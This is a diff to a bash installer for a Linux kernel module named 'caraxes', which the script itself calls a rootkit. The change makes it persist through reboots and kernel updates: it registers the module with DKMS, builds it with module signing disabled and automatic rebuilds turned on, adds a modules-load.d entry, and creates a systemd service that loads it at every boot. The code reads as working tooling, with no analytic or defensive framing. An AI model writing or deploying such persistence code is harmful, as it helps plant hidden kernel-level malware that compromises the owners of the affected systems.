@@ -60,7 +60,8 @@ install_dependencies() {
                 make \
                 gcc \
                 git \
-                kmod
+                kmod \
+                dkms
             ;;
         "fedora"|"rhel"|"centos"|"rocky"|"almalinux")
             print_status "Installing dependencies for RHEL/Fedora/CentOS..."
@@ -71,7 +72,8 @@ install_dependencies() {
                     gcc \
                     make \
                     git \
-                    kmod
+                    kmod \
+                    dkms
             else
                 sudo yum install -y \
                     kernel-headers-$(uname -r) \
@@ -79,7 +81,8 @@ install_dependencies() {
                     gcc \
                     make \
                     git \
-                    kmod
+                    kmod \
+                    dkms
             fi
             ;;
         "arch"|"manjaro")
@@ -88,7 +91,8 @@ install_dependencies() {
                 linux-headers \
                 base-devel \
                 git \
-                kmod
+                kmod \
+                dkms
             ;;
         "opensuse"|"sles")
             print_status "Installing dependencies for openSUSE..."
@@ -97,7 +101,8 @@ install_dependencies() {
                 gcc \
                 make \
                 git \
-                kmod
+                kmod \
+                dkms
             ;;
         *)
             print_warning "Unknown distribution. Please install the following manually:"
@@ -177,68 +182,74 @@ compile_rootkit() {
     fi
 }
 
-# Function to install module to system location
-install_module_system() {
-    print_status "Installing module to system location..."
+# Function to install module using DKMS for persistence
+install_module_dkms() {
+    print_status "Installing module using DKMS for persistence..."
     
-    CURRENT_DIR=$(pwd)
+    MODULE_NAME="caraxes"
+    MODULE_VERSION="1.0"
+    SRC_DIR=$(pwd)
+    DKMS_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"
     
-    # Create directory structure and install module
-    if sudo mkdir -p /lib/modules/$(uname -r)/kernel/drivers/caraxes; then
-        print_success "Created module directory"
-    else
-        print_error "Failed to create module directory"
-        exit 1
-    fi
+    # Prepare DKMS source directory
+    print_status "Preparing DKMS source directory..."
+    sudo rm -rf "$DKMS_DIR"
+    sudo mkdir -p "$DKMS_DIR"
 
-    # Copy module to system location
-    if sudo cp "$CURRENT_DIR/caraxes.ko" /lib/modules/$(uname -r)/kernel/drivers/caraxes/; then
-        print_success "Module copied to system directory"
-    else
-        print_error "Failed to copy module"
-        exit 1
-    fi
+    print_status "Copying source files..."
+    sudo cp -r "$SRC_DIR"/* "$DKMS_DIR"
 
-    # Check if module is already loaded and remove it
-    if lsmod | grep -q caraxes; then
-        print_warning "Module already loaded, removing it first..."
-        sudo rmmod caraxes || true
-    fi
+    print_status "Creating dkms.conf..."
+    sudo tee "$DKMS_DIR/dkms.conf" > /dev/null <<EOF
+PACKAGE_NAME="${MODULE_NAME}"
+PACKAGE_VERSION="${MODULE_VERSION}"
+BUILT_MODULE_NAME[0]="${MODULE_NAME}"
+DEST_MODULE_LOCATION[0]="/updates/dkms"
+AUTOINSTALL="yes"
+MAKE[0]="make CONFIG_MODULE_SIG=n -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build modules"
+CLEAN="make -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build clean"
+EOF
 
-    # Load the module
-    if sudo insmod /lib/modules/$(uname -r)/kernel/drivers/caraxes/caraxes.ko; then
+    print_status "Cleaning previous DKMS module if exists..."
+    sudo dkms remove -m "$MODULE_NAME" -v "$MODULE_VERSION" --all || true
+
+    print_status "Adding, building, and installing module via DKMS..."
+    sudo dkms add -m "$MODULE_NAME" -v "$MODULE_VERSION"
+    sudo dkms build -m "$MODULE_NAME" -v "$MODULE_VERSION"
+    sudo dkms install -m "$MODULE_NAME" -v "$MODULE_VERSION"
+
+    # Auto-load using /etc/modules-load.d
+    print_status "Configuring module to auto-load at boot via modules-load.d..."
+    echo "$MODULE_NAME" | sudo tee "/etc/modules-load.d/${MODULE_NAME}.conf" > /dev/null
+
+    # Add systemd service as fallback
+    print_status "Creating systemd service to load module..."
+    sudo tee "/etc/systemd/system/load_${MODULE_NAME}.service" > /dev/null <<EOF
+[Unit]
+Description=Load ${MODULE_NAME} module at boot
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/sbin/modprobe ${MODULE_NAME}
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    sudo systemctl daemon-reexec
+    sudo systemctl daemon-reload
+    sudo systemctl enable load_${MODULE_NAME}.service
+
+    print_status "Loading module now..."
+    if sudo modprobe "$MODULE_NAME"; then
         print_success "Module loaded successfully"
     else
-        print_error "Failed to load module"
-        print_warning "Try manually removing conflicting modules with: sudo rmmod <module_name>"
-        exit 1
+        print_warning "Manual load failed. Reboot will retry via systemd."
     fi
 
-    # Update module dependencies
-    print_status "Updating module dependencies..."
-    sudo depmod -a
-
-    # Add to auto-load configuration
-    print_status "Configuring auto-load..."
-    echo "caraxes" | sudo tee /etc/modules-load.d/caraxes.conf > /dev/null
-
-    # Load with modprobe
-    if sudo modprobe caraxes; then
-        print_success "Module configured for auto-load"
-    else
-        print_warning "Module already loaded"
-    fi
-
-    echo
-    print_success "Installation completed successfully!"
-
-    # Verify module is loaded
-    print_status "Verifying module is loaded..."
-    if lsmod | grep -q caraxes; then
-        print_success "Module is now active and will auto-load on boot"
-    else
-        print_warning "Warning: Module may not be loaded properly"
-    fi
+    print_success "Module '${MODULE_NAME}' loaded and configured to auto-load on boot."
 }
 
 
@@ -268,5 +279,5 @@ clean_build
 # Compile the rootkit
 compile_rootkit
 
-# Install module to system location
-install_module_system
+# Install module using DKMS
+install_module_dkms
